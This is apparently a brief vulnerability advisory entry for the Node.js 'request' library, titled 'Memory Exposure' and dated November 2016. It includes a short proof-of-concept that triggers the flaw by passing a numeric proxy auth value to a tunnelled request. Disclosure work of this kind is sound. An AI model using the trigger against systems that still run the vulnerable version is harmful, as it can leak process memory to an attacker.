summary: |
  Memory Exposure
  PoC:
  ```js
  require('request')({
    method: 'GET',
    uri: 'http://www.example.com',
    tunnel: true,
    proxy:{
        protocol: 'http:',
        host:'127.0.0.1',
        port:8080,
        auth:80 // number
    }
  });
  ```

  Reported at 2016-11-20.
